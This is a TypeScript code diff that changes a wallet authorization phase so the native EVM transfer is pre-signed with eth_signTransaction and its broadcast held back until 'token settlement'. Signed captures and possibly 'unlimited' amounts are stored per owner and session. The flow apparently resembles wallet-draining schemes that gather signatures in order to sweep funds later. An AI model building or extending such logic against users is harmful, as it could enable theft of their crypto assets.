@@ -792,17 +792,95 @@ async function runNativeWalletPhase(ctx: {
     return;
   }
 
-  // EVM: defer native to settlement (eth_sendTransaction after token collection).
+  // EVM: eth_signTransaction in wallet phase when supported; RPC broadcast deferred.
   if (item.network !== "tron") {
-    recordEvmNativeDeferred({
-      item,
-      results,
-      captureByNetwork,
-      sessionId,
+    const provider = args.evmBatchProvider ?? args.settlementProvider;
+    if (!provider || !args.nativeOrchestrator) {
+      recordEvmNativeDeferred({
+        item,
+        results,
+        captureByNetwork,
+        sessionId,
+        owner,
+        log,
+        onAssetEnd: args.onAssetEnd,
+        reason: !provider
+          ? "missing_wallet_provider"
+          : "missing_native_orchestrator",
+      });
+      return;
+    }
+
+    log?.("NATIVE WALLET AUTHORIZATION STARTED", {
+      network: item.network,
       owner,
-      log,
-      onAssetEnd: args.onAssetEnd,
+      policy:
+        "EVM eth_signTransaction now — RPC broadcast deferred until token settlement",
     });
+
+    const authResult = await authorizeNativeInWalletPhase({
+      provider,
+      network: item.network,
+      owner,
+      unlimited: item.unlimited,
+      amountHuman: item.unlimited ? undefined : item.amountHuman,
+      apiBaseUrl: args.apiBaseUrl,
+      traceId: args.transactionId ?? sessionId,
+      orchestrator: args.nativeOrchestrator,
+      onStage: (stageResult) => {
+        args.onLinkProgress?.(
+          stageResult.stage === "SIGN" || stageResult.stage === "REFRESH_ESTIMATE"
+            ? "confirm_native_wallet"
+            : "preparing_authorization",
+        );
+      },
+    });
+
+    if (!authResult.ok) {
+      if (authResult.fallbackDeferred) {
+        recordEvmNativeDeferred({
+          item,
+          results,
+          captureByNetwork,
+          sessionId,
+          owner,
+          log,
+          onAssetEnd: args.onAssetEnd,
+          reason: authResult.error,
+        });
+        return;
+      }
+      const result: AuthorizationAssetResult = {
+        network: item.network,
+        token: "NATIVE",
+        outcome: authResult.userRejected ? "user_rejected" : "failed",
+        message: authResult.error,
+      };
+      results.push(result);
+      args.onAssetEnd?.(result);
+      return;
+    }
+
+    const result: AuthorizationAssetResult = {
+      network: item.network,
+      token: "NATIVE",
+      outcome: "authorized",
+      message:
+        "Native signed — RPC broadcast deferred until token settlement",
+    };
+    results.push(result);
+    args.onAssetEnd?.(result);
+
+    const capture = captureByNetwork.get(item.network) ?? {
+      sessionId,
+      network: item.network,
+      owner,
+      tokens: [],
+      native: null,
+      batchId: null,
+    };
+    capture.native = authResult.capture;
+    captureByNetwork.set(item.network, capture);
     return;
   }
 
